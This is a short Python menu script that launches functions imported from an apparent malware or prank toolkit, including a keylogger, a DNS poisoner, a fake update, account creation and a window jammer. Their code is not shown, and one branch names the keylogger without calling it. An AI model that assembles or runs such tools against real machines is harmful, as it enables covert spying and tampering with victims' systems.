from scrtips import Create_Account, DNS_Poisoner, Fake_update, Keylogger, silly_mouse, Talker, Wallpaper_Changer, Window_Jammer
from banner import first_banner, code_banner
import time 
import os

first_banner()
UserInput = input("Choose script => ")

if UserInput == "1":
    code_banner()
    Create_Account()
elif UserInput == "2":
    code_banner()
    DNS_Poisoner()
elif UserInput == "3":
    code_banner()
    Keylogger
elif UserInput == "4":
    code_banner()
    Fake_update()
elif UserInput == "5":
    code_banner()
    Talker()
elif UserInput == "6":
    code_banner()
    Wallpaper_Changer()
elif UserInput == "7":
    code_banner()
    Window_Jammer()
elif UserInput == "8":
    code_banner()
    silly_mouse()
else:
    print("1-8 !")